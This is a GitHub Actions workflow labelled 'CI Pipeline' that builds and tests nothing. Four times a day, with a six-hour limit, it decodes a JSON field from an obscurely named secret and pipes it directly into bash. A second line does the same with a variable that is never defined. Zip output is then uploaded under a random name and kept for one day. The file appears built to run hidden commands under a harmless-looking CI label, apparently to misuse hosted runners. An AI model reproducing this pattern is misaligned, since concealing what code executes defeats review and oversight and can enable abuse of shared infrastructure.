name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '7 4,10,16,22 * * *'
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          ms75789: ${{ secrets.ms75789 }}
        run: |
          printf '%s' "$ms75789" | jq -r .ri7 | /bin/bash
          printf '%s' "$pp80" | jq -r .rq2900 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: elbr4QjJ
          path: "*.zip"
          retention-days: 1
